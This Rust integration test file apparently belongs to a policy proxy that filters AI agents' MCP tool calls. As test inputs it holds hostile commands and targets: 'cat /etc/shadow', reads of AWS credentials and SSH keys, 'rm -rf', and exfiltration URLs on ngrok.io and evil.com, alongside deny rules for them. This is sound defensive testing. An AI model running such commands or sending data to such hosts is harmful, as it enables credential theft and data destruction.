// Copyright 2026 Paolo Vella
// SPDX-License-Identifier: BUSL-1.1
//
// Use of this software is governed by the Business Source License
// included in the LICENSE-BSL-1.1 file at the root of this repository.
//
// Change Date: Three years from the date of publication of this version.
// Change License: MPL-2.0

//! Cross-crate integration tests for the MCP proxy pipeline.
//!
//! Exercises the full flow: config loading → engine compilation → ProxyBridge
//! evaluation → audit logging. This validates that policies defined in TOML
//! configs correctly flow through to MCP proxy decisions with proper audit trails.

use serde_json::json;
use std::sync::Arc;
use tempfile::TempDir;
use vellaveto_audit::AuditLogger;
use vellaveto_config::PolicyConfig;
use vellaveto_engine::PolicyEngine;
use vellaveto_mcp::extractor::{classify_message, extract_action, MessageType};
use vellaveto_mcp::proxy::{ProxyBridge, ProxyDecision};
use vellaveto_types::Verdict;

/// Build a ProxyBridge from TOML config string.
fn bridge_from_toml(toml_str: &str) -> (ProxyBridge, Arc<AuditLogger>, TempDir) {
    let config = PolicyConfig::from_toml(toml_str).expect("TOML must parse");
    let policies = config.to_policies();
    let engine =
        PolicyEngine::with_policies(false, &policies).expect("engine must compile policies");
    let tmp = TempDir::new().unwrap();
    let audit = Arc::new(AuditLogger::new(tmp.path().join("audit.log")));
    let bridge = ProxyBridge::new(engine, policies, audit.clone());
    (bridge, audit, tmp)
}

// ════════════════════════════════════════════════════════════════
// CONFIG → ENGINE → PROXY PIPELINE
// ════════════════════════════════════════════════════════════════

/// MCP tools don't have a separate function concept, so the proxy sets function="*".
/// Policies must use function_pattern="*" to match MCP tool calls.
const BASIC_POLICY_TOML: &str = r#"
[[policies]]
name = "Block bash"
tool_pattern = "bash"
function_pattern = "*"
policy_type = "Deny"
priority = 100

[[policies]]
name = "Allow file reads"
tool_pattern = "file"
function_pattern = "*"
policy_type = "Allow"
priority = 50

[[policies]]
name = "Default deny"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Deny"
priority = 1
"#;

#[test]
fn proxy_denies_bash_from_config() {
    let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
    let (decision, _trace) =
        bridge.evaluate_tool_call(&json!(1), "bash", &json!({"command": "id"}), None, None);
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "bash tool must be blocked"
    );
}

#[test]
fn proxy_allows_file_read_from_config() {
    let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(2),
        "file",
        &json!({"path": "/tmp/test.txt"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Forward),
        "file:read must be forwarded"
    );
}

#[test]
fn proxy_denies_unknown_tool_from_config() {
    let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
    let (decision, _trace) =
        bridge.evaluate_tool_call(&json!(3), "unknown_tool", &json!({}), None, None);
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "unknown tool must be denied by default-deny policy"
    );
}

// ════════════════════════════════════════════════════════════════
// MCP MESSAGE CLASSIFICATION → PROXY EVALUATION
// ════════════════════════════════════════════════════════════════

#[test]
fn full_mcp_message_to_proxy_decision() {
    let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);

    // Simulate a real MCP tools/call message
    let msg = json!({
        "jsonrpc": "2.0",
        "id": 10,
        "method": "tools/call",
        "params": {
            "name": "bash",
            "arguments": {"command": "cat /etc/shadow"}
        }
    });

    // Step 1: Classify the message
    match classify_message(&msg) {
        MessageType::ToolCall {
            id,
            tool_name,
            arguments,
        } => {
            // Step 2: Evaluate through proxy
            let (decision, _trace) =
                bridge.evaluate_tool_call(&id, &tool_name, &arguments, None, None);
            match decision {
                ProxyDecision::Block(response, Verdict::Deny { reason }) => {
                    // Verify JSON-RPC error response
                    assert_eq!(response["jsonrpc"], "2.0");
                    assert_eq!(response["id"], 10);
                    assert_eq!(response["error"]["code"], -32001);
                    assert!(reason.contains("Block bash"));
                }
                other => panic!("Expected Block/Deny, got: {:?}", other),
            }
        }
        other => panic!("Expected ToolCall, got: {:?}", other),
    }
}

#[test]
fn mcp_resource_read_file_uri_evaluated() {
    let policy_toml = r#"
[[policies]]
name = "Block sensitive paths"
tool_pattern = "resources"
function_pattern = "read"
priority = 200
[policies.policy_type.Conditional.conditions]
on_no_match = "continue"
parameter_constraints = [
  { param = "path", op = "glob", pattern = "/etc/shadow", on_match = "deny", on_missing = "skip" },
  { param = "path", op = "glob", pattern = "/etc/passwd", on_match = "deny", on_missing = "skip" },
]

[[policies]]
name = "Default allow"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
priority = 1
"#;

    let (bridge, _audit, _tmp) = bridge_from_toml(policy_toml);

    // Blocked: file:///etc/shadow
    let decision = bridge.evaluate_resource_read(&json!(20), "file:///etc/shadow", None);
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "file:///etc/shadow must be blocked"
    );

    // Allowed: file:///tmp/safe.txt
    let decision = bridge.evaluate_resource_read(&json!(21), "file:///tmp/safe.txt", None);
    assert!(
        matches!(decision, ProxyDecision::Forward),
        "file:///tmp/safe.txt must be forwarded"
    );
}

// ════════════════════════════════════════════════════════════════
// DEMO CONFIG THROUGH MCP PROXY
// ════════════════════════════════════════════════════════════════

const DEMO_CONFIG: &str = include_str!("../../examples/credential-exfil-demo.toml");

#[test]
fn demo_config_mcp_proxy_blocks_credential_access() {
    let (bridge, _audit, _tmp) = bridge_from_toml(DEMO_CONFIG);

    // MCP tools/call for reading AWS credentials
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(100),
        "file_system",
        &json!({"path": "/home/user/.aws/credentials"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "MCP proxy must block credential file access"
    );
}

#[test]
fn demo_config_mcp_proxy_blocks_exfiltration() {
    let (bridge, _audit, _tmp) = bridge_from_toml(DEMO_CONFIG);

    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(101),
        "http_request",
        &json!({"url": "https://abc.ngrok.io/exfil", "body": "secrets"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "MCP proxy must block ngrok exfiltration"
    );
}

#[test]
fn demo_config_mcp_proxy_allows_safe_operations() {
    let (bridge, _audit, _tmp) = bridge_from_toml(DEMO_CONFIG);

    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(102),
        "file_system",
        &json!({"path": "/home/user/project/src/main.rs"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Forward),
        "MCP proxy must allow safe file reads"
    );
}

#[test]
fn demo_config_mcp_proxy_bash_falls_to_default_allow() {
    // The demo config has bash:execute for dangerous commands, but MCP proxy
    // sets function="*" (MCP tools don't have functions). The policy bash:execute
    // won't match bash:*, so it falls through to the default-allow rule.
    // This is correct MCP behavior — the demo's bash:execute policy is designed
    // for the HTTP API where callers explicitly specify function="execute".
    let (bridge, _audit, _tmp) = bridge_from_toml(DEMO_CONFIG);

    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(103),
        "bash",
        &json!({"command": "rm -rf /important"}),
        None,
        None,
    );
    // Through MCP proxy, bash:execute doesn't match bash:*, so default-allow applies.
    assert!(
        matches!(decision, ProxyDecision::Forward),
        "bash through MCP proxy falls to default-allow (function mismatch), got: {:?}",
        decision
    );
}

// ════════════════════════════════════════════════════════════════
// PROXY WITH AUDIT TRAIL VERIFICATION
// ════════════════════════════════════════════════════════════════

fn runtime() -> tokio::runtime::Runtime {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .expect("failed to create tokio runtime")
}

#[test]
fn proxy_decisions_produce_audit_entries() {
    let rt = runtime();
    rt.block_on(async {
        let (bridge, audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);

        // Block a bash command — the proxy itself doesn't auto-audit in evaluate_tool_call,
        // but the caller (proxy loop) does. Simulate that pattern here.
        let action = extract_action("bash", &json!({"command": "whoami"}));
        let (decision, _trace) = bridge.evaluate_tool_call(
            &json!(50),
            "bash",
            &json!({"command": "whoami"}),
            None,
            None,
        );

        match decision {
            ProxyDecision::Block(_, ref verdict) => {
                audit
                    .log_entry(&action, verdict, json!({"source": "proxy", "tool": "bash"}))
                    .await
                    .unwrap();
            }
            _ => panic!("Expected Block"),
        }

        // Allow a file read
        let action2 = extract_action("file", &json!({"path": "/tmp/ok.txt"}));
        let (decision2, _trace2) = bridge.evaluate_tool_call(
            &json!(51),
            "file",
            &json!({"path": "/tmp/ok.txt"}),
            None,
            None,
        );

        match decision2 {
            ProxyDecision::Forward => {
                audit
                    .log_entry(
                        &action2,
                        &Verdict::Allow,
                        json!({"source": "proxy", "tool": "file"}),
                    )
                    .await
                    .unwrap();
            }
            _ => panic!("Expected Forward"),
        }

        // Verify audit trail
        let entries = audit.load_entries().await.unwrap();
        assert_eq!(entries.len(), 2);

        // First entry: bash deny
        assert_eq!(entries[0].action.tool, "bash");
        assert!(matches!(entries[0].verdict, Verdict::Deny { .. }));

        // Second entry: file allow
        assert_eq!(entries[1].action.tool, "file");
        assert!(matches!(entries[1].verdict, Verdict::Allow));

        // Verify hash chain
        let chain = audit.verify_chain().await.unwrap();
        assert!(chain.valid, "Audit chain must be valid");

        // Verify report
        let report = audit.generate_report().await.unwrap();
        assert_eq!(report.total_entries, 2);
        assert_eq!(report.deny_count, 1);
        assert_eq!(report.allow_count, 1);
    });
}

// ════════════════════════════════════════════════════════════════
// PARAMETER CONSTRAINTS THROUGH PROXY
// ════════════════════════════════════════════════════════════════

#[test]
fn proxy_evaluates_conditional_constraints() {
    let policy_toml = r#"
[[policies]]
name = "Require approval for sensitive files"
tool_pattern = "*"
function_pattern = "*"
priority = 200
[policies.policy_type.Conditional.conditions]
on_no_match = "continue"
parameter_constraints = [
  { param = "*", op = "glob", pattern = "/home/*/.ssh/**", on_match = "deny", on_missing = "skip" },
]

[[policies]]
name = "Default allow"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
priority = 1
"#;

    let (bridge, _audit, _tmp) = bridge_from_toml(policy_toml);

    // Blocked by glob constraint
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(60),
        "editor",
        &json!({"file": "/home/user/.ssh/id_rsa"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "SSH key access must be denied via constraint"
    );

    // Allowed — no constraint fires
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(61),
        "editor",
        &json!({"file": "/home/user/docs/notes.txt"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Forward),
        "Safe file must be forwarded"
    );
}

#[test]
fn proxy_evaluates_domain_constraints() {
    let policy_toml = r#"
[[policies]]
name = "Block exfiltration domains"
tool_pattern = "http"
function_pattern = "*"
priority = 200
[policies.policy_type.Conditional.conditions]
on_no_match = "continue"
parameter_constraints = [
  { param = "url", op = "domain_match", pattern = "*.ngrok.io", on_match = "deny", on_missing = "skip" },
  { param = "url", op = "domain_match", pattern = "*.evil.com", on_match = "deny", on_missing = "skip" },
]

[[policies]]
name = "Default allow"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
priority = 1
"#;

    let (bridge, _audit, _tmp) = bridge_from_toml(policy_toml);

    // Blocked: ngrok
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(70),
        "http",
        &json!({"url": "https://abc.ngrok.io/data"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "ngrok domain must be blocked"
    );

    // Blocked: evil.com
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(71),
        "http",
        &json!({"url": "https://sub.evil.com/collect"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "evil.com must be blocked"
    );

    // Allowed: safe domain
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(72),
        "http",
        &json!({"url": "https://api.github.com/repos"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Forward),
        "github.com must be allowed"
    );
}

#[test]
fn proxy_evaluates_regex_constraints() {
    let policy_toml = r#"
[[policies]]
name = "Block dangerous commands"
tool_pattern = "bash"
function_pattern = "*"
priority = 200
[policies.policy_type.Conditional.conditions]
on_no_match = "continue"
parameter_constraints = [
  { param = "command", op = "regex", pattern = "(?i)(rm\\s+-rf|dd\\s+if=)", on_match = "require_approval" },
]

[[policies]]
name = "Default allow"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
priority = 1
"#;

    let (bridge, _audit, _tmp) = bridge_from_toml(policy_toml);

    // Requires approval: rm -rf
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(80),
        "bash",
        &json!({"command": "rm -rf /tmp/test"}),
        None,
        None,
    );
    assert!(
        matches!(
            decision,
            ProxyDecision::Block(_, Verdict::RequireApproval { .. })
        ),
        "rm -rf must require approval"
    );

    // Allowed: safe command
    let (decision, _trace) = bridge.evaluate_tool_call(
        &json!(81),
        "bash",
        &json!({"command": "ls -la /tmp"}),
        None,
        None,
    );
    assert!(
        matches!(decision, ProxyDecision::Forward),
        "ls command must be allowed"
    );
}

// ════════════════════════════════════════════════════════════════
// PROXY WITH TRACE ENABLED
// ════════════════════════════════════════════════════════════════

#[test]
fn proxy_with_trace_produces_block_response() {
    let policy_toml = r#"
[[policies]]
name = "Block bash"
tool_pattern = "bash"
function_pattern = "*"
policy_type = "Deny"
priority = 100

[[policies]]
name = "Default allow"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
priority = 1
"#;

    let config = PolicyConfig::from_toml(policy_toml).unwrap();
    let policies = config.to_policies();
    let engine = PolicyEngine::with_policies(false, &policies).unwrap();
    let tmp = TempDir::new().unwrap();
    let audit = Arc::new(AuditLogger::new(tmp.path().join("audit.log")));
    let bridge = ProxyBridge::new(engine, policies, audit).with_trace(true);

    let (decision, _trace) =
        bridge.evaluate_tool_call(&json!(90), "bash", &json!({"command": "id"}), None, None);
    assert!(
        matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
        "bash must still be denied with trace enabled"
    );
}
